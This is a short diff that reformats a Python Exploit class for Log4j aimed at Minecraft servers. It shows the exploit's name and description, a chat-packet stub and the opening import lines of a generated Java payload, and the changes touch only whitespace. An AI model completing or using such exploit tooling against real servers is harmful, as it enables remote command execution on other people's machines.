@@ -5,7 +5,8 @@ import subprocess
 
 class Exploit:
     """Exploit schema"""
-    def __init__(self, client: Connection=None, command: str=None, ip: str=None, port: str=None):
+
+    def __init__(self, client: Connection = None, command: str = None, ip: str = None, port: str = None):
         self.name = "Log4j"
         self.description = "Java vuln that allows user to issue commands to the server to make an LDAP connection"
         self.command = command
@@ -21,7 +22,7 @@ class Exploit:
         packet = minecraft.networking.packets.ChatPacket()
 
         genExploit = (
-        """
+                         """
         import java.io.IOException;
         import java.io.InputStream;
         import java.io.OutputStream;
